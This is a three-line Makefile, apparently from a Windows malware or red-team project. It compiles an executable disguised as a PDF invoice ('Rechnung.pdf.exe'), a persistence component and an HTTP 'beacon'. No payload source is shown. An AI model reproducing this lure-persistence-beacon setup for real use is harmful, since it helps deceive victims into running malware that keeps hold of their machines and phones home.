build:
	gcc -mwindows -o Rechnung.pdf.exe Rechnung.pdf.c script_constants/script_constants.c helpers.c
	gcc -mwindows -o persistance.exe persistance.c helpers.c
	gcc -mwindows -o beacon.exe beacon.c httprequests.c -lwinhttp